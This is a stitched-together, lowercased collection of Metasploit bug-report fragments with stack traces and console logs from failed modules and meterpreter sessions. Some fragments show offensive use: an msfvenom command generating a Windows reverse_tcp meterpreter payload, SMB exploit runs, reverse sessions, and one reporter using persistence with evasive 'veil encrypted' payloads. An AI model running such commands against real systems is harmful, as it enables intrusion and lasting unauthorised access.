file sizes are wrong during "ls", file up/download fails.
on python it will give an error, on linux it will show wrong file sizes (might me mod 2^32)
## system stuff
all ports - 'open' and 'closed' - are shown.
![services]( ## system stuff
on start, database fails to connect due to "connection refused." if i run `msfdb init` before running `msfconsole` it connects fine, but wiping the database before every time i run metasploit is not something i want in the long run
db_status returns:
`[*] postgresql selected, no connectiondb` after running `db_connect -y c:\\users\\myuser\\.msf4\\database.yml`, db_status returns the same ## system stuff
windows 10 pro
10.0.17134 build 17134
i get an error with a squelched stack trace (that i am unable to find in the logs): ```
msf5 exploit(windows/smb/ms17_010_psexec) > run [*] started reverse tcp handler on 172.28.128.1:4444 [-] 172.28.128.3:445 - rex::proto::smb::exceptions::loginerror: login failed: undefined method `force_encoding' for nil:nilclass
[*] exploit completed, but no session was created.
``` ## system stuff testing against a base windows 2012 r2 install with a share that has read/write permission to everyone
using a dev checkout of framework on osx 10.13.6
[3] pry(#<msf::modules::mod706f73742f77696e646f77732f6d616e6167652f6d6574737663::metasploitmodule>)> code = file.read("/tmp/metsvc.c");nil
[4] pry(#<msf::modules::mod706f73742f77696e646f77732f6d616e6167652f6d6574737663::metasploitmodule>)> bin = metasploit::framework::compiler::windows.compile_c(code)
metasm::parseerror: invalid specifier list near "uintptr_t" at "</usr/include/sys/_types/_uintptr_t.h>" line 30, included from "\\"/usr/include/i386/types.h\\"" line 95, included from "</usr/include/machine/types.h>" line 36, included from "\\"/usr/include/mach/i386/_structs.h\\"" line 38, included from "</usr/include/mach/machine/_structs.h>" line 34, included from "\\"/usr/include/i386/_mcontext.h\\"" line 36, included from "</usr/include/machine/_mcontext.h>" line 30, included from "</usr/include/sys/signal.h>" line 148, included from "</usr/include/sys/wait.h>" line 110, included from "</usr/include/stdlib.h>" line 66, included from "\\"<unk>\\"" line 3
from /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/metasm-1.0.3/metasm/parse_c.rb:2069:in `parse_type_base'
``` the source code file is on it could be compiled by `ming32-64` ## system stuff
i get an error complaining that ed25519 is missing
## system stuff
i tried this on kali linux and then on manjaro
same behaviour on both
installed with the official package manager in both cases.
i also tried to install ed25519, but i don't know anything about ruby, so that didn't help.
i get this error: osmc@osmc-gilbert:/opt/metasploit-framework$ ./msfdb start
starting database at /home/osmc/.msf4/db...failed your database may be corrupt, would you like to reinitialize it?: y
database is no longer running at /home/osmc/.msf4/db
delete all data at /home/osmc/.msf4/db?: y
deleting all data at /home/osmc/.msf4/db
delete database configuration at /home/osmc/.msf4/database.yml?: y
creating database at /home/osmc/.msf4/db
/usr/lib/ruby/2.3.0/open3.rb:199:in `spawn': no such file or directory - initdb (errno::enoent) from /usr/lib/ruby/2.3.0/open3.rb:199:in `popen_run' from /usr/lib/ruby/2.3.0/open3.rb:95:in `popen3' from ./msfdb:65:in `run_cmd' from ./msfdb:184:in `create_db' from ./msfdb:208:in `init_db' from ./msfdb:372:in `reinit_db' from ./msfdb:154:in `start_db' from ./msfdb:903:in `invoke_command' from ./msfdb:945:in `block in <main>' from ./msfdb:944:in `each' from ./msfdb:944:in `<main>'
osmc@osmc-gilbert:/opt/metasploit-framework$ you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff raspbian (osmc version)
[-] auxiliary failed: socketerror getaddrinfo: nodename nor servname provided, or not known
[-] call stack:
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:189:in `gethostbyname'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:189:in `getaddresses'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:173:in `getaddress'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:263:in `resolv_nbo'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb:277:in `resolv_nbo_i'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/switch_board.rb:233:in `best_comm'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/switch_board.rb:127:in `best_comm'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:195:in `initialize'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:38:in `new'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/parameters.rb:38:in `from_hash'
[-] /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket/tcp.rb:28:in `create'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:177:in `connect'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:244:in `send_request'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:229:in `_send_recv'
[-] /users/green/msfdev/metasploit-framework/lib/rex/proto/http/client.rb:210:in `send_recv'
[-] /users/green/msfdev/metasploit-framework/lib/msf/core/exploit/http/client.rb:367:in `send_request_cgi'
[-] /users/green/msfdev/metasploit-framework/modules/auxiliary/admin/http/joomla_registration_privesc.rb:45:in `check'
[-] /users/green/msfdev/metasploit-framework/modules/auxiliary/admin/http/joomla_registration_privesc.rb:79:in `run'
[*] auxiliary module execution completed
msf5 auxiliary(admin/http/joomla_registration_privesc) >
``` ## system stuff
the ui indicates that the session isn't encrypted (need to determine if the ui is lying or not)
## system stuff
errors out because the paths the module looks for are out of date
_[*] looking for c:\\users\\temp\\appdata\\local\\felix_deimel\\mremote\\confcons.xml
[*] looking for c:\\users\\temp\\appdata\\local\\..\ oaming\\mremoteng\\confcons.xml
[*] looking for c:\\users\\administrator\\appdata\\local\\felix_deimel\\mremote\\confcons.xml
[*] looking for c:\\users\\administrator\\appdata\\local\\..\ oaming\\mremoteng\\confcons.xml
[*] looking for c:\\users\\adminmpindoria\\appdata\\local\\felix_deimel\\mremote\\confcons.xml
[*] looking for c:\\users\\adminmpindoria\\appdata\\local\\..\ oaming\\mremoteng\\confcons.xml
[*] looking for c:\\users\ hu\\appdata\\local\\felix_deimel\\mremote\\confcons.xml
[*] looking for c:\\users\ hu\\appdata\\local\\..\ oaming\\mremoteng\\confcons.xml
[*] looking for c:\\users\\admin\\appdata\\local\\felix_deimel\\mremote\\confcons.xml
[*] looking for c:\\users\\admin\\appdata\\local\\..\ oaming\\mremoteng\\confcons.xml_ **should be:** c:\\users\\admin\\appdata\ oaming\\mremoteng ## system stuff framework: 4.17.6-dev-
console : 4.17.6-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
**- [x ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
ubuntu 18.0
powershell.exe crashes when running the supplied command
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff ubuntu 18 x64
attacking windows 10 ent 1709 x64
no `--encrypt` option.
verison: `framework version: 4.17.6-dev-`
root@sssss-debian-tor1:~# msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
error: invalid option
msfvenom - a metasploit standalone payload generator.
also a replacement for msfpayload and msfencode.
usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val> options: -l, --list <type> list all modules for [type]
types are: payloads, encoders, nops, platforms, formats, all -p, --payload <payload> payload to use (--list payloads to list, --list-options for arguments)
specify '-' or stdin for custom --list-options list --payload <value>'s standard, advanced and evasion options -f, --format <format> output format (use --list formats to list) -e, --encoder <encoder> the encoder to use (use --list encoders to list) --smallest generate the smallest possible payload using all available encoders -a, --arch <arch> the architecture to use for --payload and --encoders --platform <platform> the platform for --payload (use --list platforms to list) -o, --out <path> save the payload to a file -b, --bad-chars <list> characters to avoid example: '\\x00\\xff' -n, --nopsled <length> prepend a nopsled of [length] size on to the payload -s, --space <length> the maximum size of the resulting payload --encoder-space <length> the maximum size of the encoded payload (defaults to the -s value) -i, --iterations <count> the number of times to encode the payload -c, --add-code <path> specify an additional win32 shellcode file to include -x, --template <path> specify a custom executable file to use as a template -k, --keep preserve the --template behaviour and inject the payload as a new thread -v, --var-name <value> specify a custom variable name to use for certain output formats -t, --timeout <second> the number of seconds to wait when reading the payload from stdin (default 30, 0 to disable) -h, --help show this message
``` ## system stuff
hostname doesn't resolve
## system stuff
error is thrown ## system stuff
a file is uploaded and deleted, but not executed
## system stuff
``` msf5 auxiliary(gather/enum_dns) > run [*] querying dns ns records for google.it
[+] google.it ns: ns1.google.com.
[+] google.it ns: ns2.google.com.
[+] google.it ns: ns3.google.com.
[+] google.it ns: ns4.google.com.
[*] attempting dns axfr for google.it from ns1.google.com.
[+] ns1.google.com
a: 216.239.32.10
w, [2018-07-15t17:17:27.751869 #7252] warn -- : axfr query, switching to tcp
[*] attempting dns axfr for google.it from ns2.google.com.
[+] ns2.google.com
a: 216.239.34.10
w, [2018-07-15t17:17:27.874698 #7252] warn -- : axfr query, switching to tcp
[*] attempting dns axfr for google.it from ns3.google.com.
[+] ns3.google.com
a: 216.239.36.10
w, [2018-07-15t17:17:28.031805 #7252] warn -- : axfr query, switching to tcp
[*] attempting dns axfr for google.it from ns4.google.com.
[+] ns4.google.com
a: 216.239.38.10
w, [2018-07-15t17:17:28.177594 #7252] warn -- : axfr query, switching to tcp
[+] google.it a: 216.58.205.195
[*] querying dns cname records for google.it
[*] querying dns ns records for google.it
[+] google.it ns: ns1.google.com.
[+] google.it ns: ns2.google.com.
[+] google.it ns: ns3.google.com.
[+] google.it ns: ns4.google.com.
[*] querying dns mx records for google.it
[+] google.it mx: aspmx.l.google.com.
[+] google.it mx: alt1.aspmx.l.google.com.
[+] google.it mx: alt2.aspmx.l.google.com.
[+] google.it mx: alt3.aspmx.l.google.com.
[+] google.it mx: alt4.aspmx.l.google.com.
[*] querying dns soa records for google.it
[+] google.it soa: ns1.google.com.
[*] querying dns txt records for google.it
[+] google.it txt: v=spf1 -all
[*] querying dns srv records for google.it
[-] auxiliary failed: argumenterror comparison of fixnum with nil failed
[-] call stack:
[-] c:/pentestbox/bin/metasploit-framework/modules/auxiliary/gather/enum_dns.rb:144:in `<'
[-] c:/pentestbox/bin/metasploit-framework/modules/auxiliary/gather/enum_dns.rb:144:in `dns_reverse'
[-] c:/pentestbox/bin/metasploit-framework/modules/auxiliary/gather/enum_dns.rb:73:in `run'
[*] auxiliary module execution completed
``` ## system stuff
in addition to the above error, `~/.msf4/logs/framework.log` shows: ```
[07/06/2018 13:22:47] [e(0)] core: invalid :session, expected session object got msf::sessions::meterpreter_x64_win /home/administrator/git/r7/metasploit-framework/lib/msf/core/db_manager/route.rb:10:in `report_session_route'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:106:in `method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/framework.rb:494:in `on_session_route'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `each'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/session.rb:426:in `<<'
/var/lib/gems/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/switch_board.rb:80:in `add_route'
/home/administrator/git/r7/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:909:in `cmd_route'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:546:in `run_command'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:508:in `block in run_single'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `each'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_single'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/shell.rb:208:in `run'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:49:in `<main>'
[07/06/2018 13:22:48] [w(0)] core: exception caught in bind handler: nomethoderror undefined method `socket' for nil:nilclass
[07/06/2018 13:22:48] [w(0)] core: exception caught in bind handler: nomethoderror undefined method `socket' for nil:nilclass
[ last line repeats about 15 times ] [07/06/2018 13:23:29] [e(0)] core: invalid :session, expected session object got msf::sessions::meterpreter_x64_win /home/administrator/git/r7/metasploit-framework/lib/msf/core/db_manager/route.rb:28:in `report_session_route_remove'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:106:in `method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/framework.rb:500:in `on_session_route_remove'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `each'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/event_dispatcher.rb:181:in `method_missing'
/home/administrator/git/r7/metasploit-framework/lib/msf/core/session.rb:431:in `delete'
/var/lib/gems/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/switch_board.rb:200:in `block in flush_routes'
/var/lib/gems/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/switch_board.rb:198:in `each'
/var/lib/gems/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/switch_board.rb:198:in `flush_routes'
/var/lib/gems/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/switch_board.rb:101:in `flush_routes'
/home/administrator/git/r7/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:931:in `cmd_route'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:546:in `run_command'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:508:in `block in run_single'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `each'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_single'
/home/administrator/git/r7/metasploit-framework/lib/rex/ui/text/shell.rb:208:in `run'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/administrator/git/r7/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:49:in `<main>'
[07/06/2018 13:24:32] [w(0)] core: no connection received before the handler completed
[07/06/2018 13:25:56] [w(0)] core: warning: trying to report a session_event for a session with no db_record (2)
[07/06/2018 13:25:56] [w(0)] core: warning: trying to report a session_event for a session with no db_record (2) [ last line repeats about 20 times ] ``` ## system stuff
a traceback occurs
the following message is printed to the user:
[-] error running command execute: nomethoderror undefined method `fd' for nil:nilclass
``` strangely, i don't see any details in `development.log`: ```
$ egrep -v "schema|create|drop" ~/.msf4/logs/development.log
``` ## system stuff
saving apparently automatically enables disablepayloadhandler setting disablepayloadhandler to false does nothing ## system stuff
i only get meterpreter session ## system stuff
the terminal show "stdapi_fs_stat" when i use ls commands and some other like cat crontab.
but when i do "ls //" it works so i don\'t know what is the error ._.
here are the line in the msf logs for stdapi error ```
[06/25/2018 22:09:53] [e(0)] meterpreter: stdapi_fs_stat: operation failed: 1
[06/25/2018 22:09:53] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file_stat.rb:93:in `stat'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file_stat.rb:50:in `initialize'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb:184:in `new'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb:184:in `stat'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:682:in `cmd_ls'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:546:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:508:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:203:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:567:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:49:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1391:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:546:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:508:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_single'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:141:in `cmd_exploit'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:546:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:508:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:502:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:208:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
``` i dont have any logs on /opt/metasploit/apps/pro/engine/config/logs/framework.log, this is the logs on ~/.msf4/logs/framework.log ## system stuff i'm on kali-linux (gnome 3.28.2)
getting meterpreter sessions over ssh across reboots but no stdapi commands loaded and when i type "load stdapi" it says meterpreter > load stdapi
loading extension stdapi...
[-] failed to load extension: no response was received to the core_enumextcmd request
then after few minutes sessions die, even when the running service is given nt authority system privileges.
also the output of "sessions" command gives nothing under information heading but all others are showing..
meterpreter x86/windows 127.0.0.1:34587 -------> 127.0.0.1:4444 but when using meterpreter persistence script with same settings over wan/internet i'm getting meterpreter shell over ssh with stdapi loaded
but this persistence script is not working after reboot of target so i'm using veil encrypted payloads
here the "sessions" output is 1
meterpreter x86/windows nt authority/system 127.0.0.1:34587 -------> 127.0.0.1:4444
## system stuff
> msf auxiliary(scanner/portscan/tcp) > run
#<thread: @/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 11: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' 10: from /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb:72:in `block (2 levels) in run_host' 9: from /usr/share/metasploit-framework/lib/msf/core/exploit/tcp.rb:102:in `connect' 8: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:28:in `create' 7: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:37:in `create_param' 6: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket.rb:49:in `create_param' 5: from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:588:in `create' 4: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket.rb:73:in `create' 3: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket.rb:104:in `create_tcp_client_channel' 2: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:36:in `open' 1: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:117:in `create'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:225:in `send_request': operation timed out
(rex::timeouterror)
``` `cat ~/.msf4/logs/framework.log` ```
> [06/22/2018 03:24:33] [e(0)] core: call stack
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:225:in `send_request'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/channel.rb:117:in `create'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:36:in `open'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket.rb:104:in `create_tcp_client_channel'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket.rb:73:in `create'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:588:in `create'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket.rb:49:in `create_param'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:37:in `create_param'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:28:in `create'
/usr/share/metasploit-framework/lib/msf/core/exploit/tcp.rb:102:in `connect'
/usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb:72:in `block (2 levels) in run_host'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[06/22/2018 03:24:33] [e(0)] core: thread exception: module(scanner/portscan/tcp)-10.1.1.1:8 critical=false error: rex::timeouterror operation timed out
source: /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb:65:in `block in run_host' /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb:62:in `upto' /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb:62:in `run_host' /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run' /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
instead i\'m having a message tells that this " /wp-login.php " seems not to be a wordpress site
when i changed "targeturi to 192.168.1.10"
i got "192.168.1.10" seems not to be a wordpress site ### os what os are you running metasploit on?
i'm running kali linux
msf exploit(multi/handler) > sessions -i active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 33 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52516 (127.0.0.1) 34 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52520 (127.0.0.1) 36 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52528 (127.0.0.1) 37 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52532 (127.0.0.1) 38 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52536 (127.0.0.1) 39 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52540 (127.0.0.1) 40 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52544 (127.0.0.1) 41 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52548 (127.0.0.1) 42 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52552 (127.0.0.1) 43 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52556 (127.0.0.1) msf exploit(multi/handler) > [*] 127.0.0.1 - meterpreter session 33 closed
reason: died
[*] 127.0.0.1 - meterpreter session 34 closed
reason: died
[*] meterpreter session 44 opened (127.0.0.1:7777 -> 127.0.0.1:52566) at 2018-06-16 13:11:43 +0530
[*] 127.0.0.1 - meterpreter session 37 closed
reason: died
[*] meterpreter session 45 opened (127.0.0.1:7777 -> 127.0.0.1:52576) at 2018-06-16 13:11:54 +0530
[*] 127.0.0.1 - meterpreter session 42 closed
reason: died
[*] 127.0.0.1 - meterpreter session 36 closed
reason: died
[*] 127.0.0.1 - meterpreter session 38 closed
reason: died
[*] 127.0.0.1 - meterpreter session 39 closed
reason: died
[*] meterpreter session 46 opened (127.0.0.1:7777 -> 127.0.0.1:52670) at 2018-06-16 13:13:11 +0530
[*] 127.0.0.1 - meterpreter session 40 closed
reason: died
[*] 127.0.0.1 - meterpreter session 41 closed
reason: died
[*] meterpreter session 47 opened (127.0.0.1:7777 -> 127.0.0.1:52674) at 2018-06-16 13:13:14 +0530
[*] meterpreter session 48 opened (127.0.0.1:7777 -> 127.0.0.1:52678) at 2018-06-16 13:13:21 +0530
[*] meterpreter session 49 opened (127.0.0.1:7777 -> 127.0.0.1:52682) at 2018-06-16 13:13:24 +0530
[*] meterpreter session 50 opened (127.0.0.1:7777 -> 127.0.0.1:52686) at 2018-06-16 13:13:31 +0530
[*] meterpreter session 51 opened (127.0.0.1:7777 -> 127.0.0.1:52690) at 2018-06-16 13:13:34 +0530
[*] 127.0.0.1 - meterpreter session 43 closed
reason: died
[*] meterpreter session 52 opened (127.0.0.1:7777 -> 127.0.0.1:52694) at 2018-06-16 13:13:47 +0530
[*] meterpreter session 53 opened (127.0.0.1:7777 -> 127.0.0.1:52698) at 2018-06-16 13:13:49 +0530
[*] meterpreter session 54 opened (127.0.0.1:7777 -> 127.0.0.1:52702) at 2018-06-16 13:13:57 +0530
[*] meterpreter session 55 opened (127.0.0.1:7777 -> 127.0.0.1:52706) at 2018-06-16 13:14:00 +0530
[*] meterpreter session 56 opened (127.0.0.1:7777 -> 127.0.0.1:52734) at 2018-06-16 13:14:08 +0530
[*] meterpreter session 57 opened (127.0.0.1:7777 -> 127.0.0.1:52738) at 2018-06-16 13:14:10 +0530
[*] meterpreter session 58 opened (127.0.0.1:7777 -> 127.0.0.1:52742) at 2018-06-16 13:14:18 +0530
[*] meterpreter session 59 opened (127.0.0.1:7777 -> 127.0.0.1:52746) at 2018-06-16 13:14:21 +0530
[*] meterpreter session 60 opened (127.0.0.1:7777 -> 127.0.0.1:52750) at 2018-06-16 13:14:28 +0530
[*] meterpreter session 61 opened (127.0.0.1:7777 -> 127.0.0.1:52756) at 2018-06-16 13:14:31 +0530
[*] meterpreter session 62 opened (127.0.0.1:7777 -> 127.0.0.1:52816) at 2018-06-16 13:14:39 +0530
[*] meterpreter session 63 opened (127.0.0.1:7777 -> 127.0.0.1:52828) at 2018-06-16 13:14:41 +0530
[*] 127.0.0.1 - meterpreter session 44 closed
reason: died
[*] meterpreter session 64 opened (127.0.0.1:7777 -> 127.0.0.1:52832) at 2018-06-16 13:14:49 +0530
[*] meterpreter session 65 opened (127.0.0.1:7777 -> 127.0.0.1:52836) at 2018-06-16 13:14:51 +0530
[*] 127.0.0.1 - meterpreter session 45 closed
reason: died
[*] meterpreter session 66 opened (127.0.0.1:7777 -> 127.0.0.1:52840) at 2018-06-16 13:14:59 +0530
[*] meterpreter session 67 opened (127.0.0.1:7777 -> 127.0.0.1:52844) at 2018-06-16 13:15:02 +0530
[*] meterpreter session 68 opened (127.0.0.1:7777 -> 127.0.0.1:52848) at 2018-06-16 13:15:10 +0530
[*] meterpreter session 69 opened (127.0.0.1:7777 -> 127.0.0.1:52852) at 2018-06-16 13:15:12 +0530
[*] 127.0.0.1 - meterpreter session 47 closed
reason: died
[*] meterpreter session 70 opened (127.0.0.1:7777 -> 127.0.0.1:52880) at 2018-06-16 13:15:20 +0530
[*] meterpreter session 71 opened (127.0.0.1:7777 -> 127.0.0.1:52884) at 2018-06-16 13:15:22 +0530
[*] meterpreter session 72 opened (127.0.0.1:7777 -> 127.0.0.1:52888) at 2018-06-16 13:15:30 +0530
[*] meterpreter session 73 opened (127.0.0.1:7777 -> 127.0.0.1:52892) at 2018-06-16 13:15:33 +0530
[*] meterpreter session 74 opened (127.0.0.1:7777 -> 127.0.0.1:52896) at 2018-06-16 13:15:40 +0530
[*] meterpreter session 75 opened (127.0.0.1:7777 -> 127.0.0.1:52900) at 2018-06-16 13:15:43 +0530
[*] meterpreter session 76 opened (127.0.0.1:7777 -> 127.0.0.1:52904) at 2018-06-16 13:15:51 +0530
[*] meterpreter session 77 opened (127.0.0.1:7777 -> 127.0.0.1:52908) at 2018-06-16 13:15:53 +0530
[*] meterpreter session 78 opened (127.0.0.1:7777 -> 127.0.0.1:52912) at 2018-06-16 13:16:01 +0530
[*] meterpreter session 79 opened (127.0.0.1:7777 -> 127.0.0.1:52916) at 2018-06-16 13:16:03 +0530
[*] 127.0.0.1 - meterpreter session 56 closed
reason: died
[*] meterpreter session 80 opened (127.0.0.1:7777 -> 127.0.0.1:52928) at 2018-06-16 13:16:11 +0530
[*] 127.0.0.1 - meterpreter session 46 closed
reason: died
[*] meterpreter session 81 opened (127.0.0.1:7777 -> 127.0.0.1:52934) at 2018-06-16 13:16:14 +0530
[*] 127.0.0.1 - meterpreter session 59 closed
reason: died
[*] meterpreter session 82 opened (127.0.0.1:7777 -> 127.0.0.1:52938) at 2018-06-16 13:16:21 +0530
[*] 127.0.0.1 - meterpreter session 48 closed
reason: died
